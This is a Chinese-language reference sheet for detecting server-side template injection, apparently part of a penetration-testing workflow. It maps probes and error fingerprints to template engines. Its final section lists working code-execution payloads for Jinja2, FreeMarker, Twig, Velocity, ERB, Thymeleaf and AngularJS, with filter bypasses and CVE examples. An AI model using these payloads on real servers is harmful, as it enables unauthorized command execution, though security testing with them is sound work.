---
id: ssti-engine-map
title: SSTI 模板引擎识别与求值探针表
tags: ssti,模板注入,jinja,twig,freemarker,velocity,s4
---
# SSTI 引擎识别表（异常求值 → 引擎定位 → 分级）

> 判据原则：**算术求值差异（7*7=49）是唯一确证判据**；报错页指纹只作引擎线索。利用级（RCE 构造）确证后转 S5。

## 一、求值探针链（逐级收敛引擎）

```
{{7*7}}   → 49            # Jinja2/Twig/Nunjucks/Liquid/Go tmpl 语法族
${7*7}    → 49            # FreeMarker/Velocity/Thymeleaf(se)/EL/JSP EL/Struts OGNL
<%= 7*7 %>→ 49            # ERB/EJS/JSP scriptlet
#{7*7}    → 49            # Ruby/Thymeleaf/PEbble
{{7*'7'}} → 7777777       # Jinja2 专有（字符串乘法）→ 与 Twig 区分
${{7*7}}  / #{7*7}        # Pebble/Twirl 区分
<@=7*7@> / ${"a"+7*7}     # FreeMarker 变体
```

## 二、报错指纹速查

| 报错特征 | 引擎 |
|---|---|
| `jinja2.exceptions` / `Traceback (most recent call last)` + py | Jinja2/Mako |
| ` Twig_Error / Expected end of block` | Twig |
| `freemarker.core` / `Expression syntax` | FreeMarker |
| `org.apache.velocity` | Velocity |
| `ognl.` / `struts.` | Struts2 OGNL |
| `PEbble` / `mvel2` | Pebble/MVEL |
| `Smarty Compiler` | PHP Smarty |

## 三、影响分级（探针确认后按此定级，RCE 构造转 S5）

1. **求值类**（算术/逻辑求值）：确证模板执行——record_finding（cwe-1336，中危起）。
2. **对象访问类**：`{{config}}` `{{self}}`（Jinja2）、`.vars`（Velocity）等沙箱内属性可读 → 信息泄露级。
3. **RCE 候选**：引擎暴露全局对象/类加载（Jinja2 globals、FreeMarker `.getClass`、Velocity vars）→ **不在 s4 构造利用链，转 S5 受控验证**（审批+最小影响）。

## 四、触发源（与 hypothesis-0day 联动）

- 模板渲染异常：用户输入回显在「渲染后」位置（html 被解码/表达式残缺）、报错含引擎栈、页面局部缓存怪异。
- 富文本/邮件模板/报表导出/翻译字段（i18n）是高发位——injection-points 六入口都要过。

### 各引擎 RCE 链与探针补全

Jinja2 五链：`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`；`{{''.__class__.__mro__[1].__subclasses__()[N]('id',shell=True,stdout=-1).communicate()[0]}}`（N 用 `{% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if 'Popen' in c.__name__ %}{{loop.index}}{% endif %}{% endfor %}` 定位）；`{{request|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('popen')('id')|attr('read')()}}`；`{{lipsum.__globals__.os.popen('id').read()}}`；`{{cycler.__init__.__globals__.os.popen('id').read()}}`。沙箱绕过：`_` 被滤→`''|attr('\x5f\x5fclass\x5f\x5f')`；`.` 被滤→`''['__class__']`；自动转义→`|safe`。

FreeMarker：`<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` + ObjectConstructor/BufferedReader 链。Twig：1.x `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`；2.x `{{['id']|map('system')|join}}`。Velocity：`#set($rt=$currentNode.getClass().forName("java.lang.Runtime"))...`。ERB：`<%= system('id') %>`。Thymeleaf 预处理：`__${T(java.lang.Runtime).getRuntime().exec("id")}__::type`。**AngularJS 客户端模板注入**（独立概念）：判据 `{{1+1}}` 页面显示 2；逃逸 `{{constructor.constructor('alert(1)')()}}`；1.5.x `{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}`。探针补：`@(7*7)`→Razor、`{7*7}`→Smarty；polyglot 首包 `${{<%[%'"}}%\.`；盲 SSTI 布尔 `(3*4/2)` vs `3*)2(/4`；Flask debug PIN 六要素（用户名/模块名/路径/MAC 十进制/machine-id+boot_id+cgroup/PIN 计算器）。Maccms `{if-A:phpinfo()}{endif-A}`；Jira CVE-2019-11581 Velocity 邮件回显。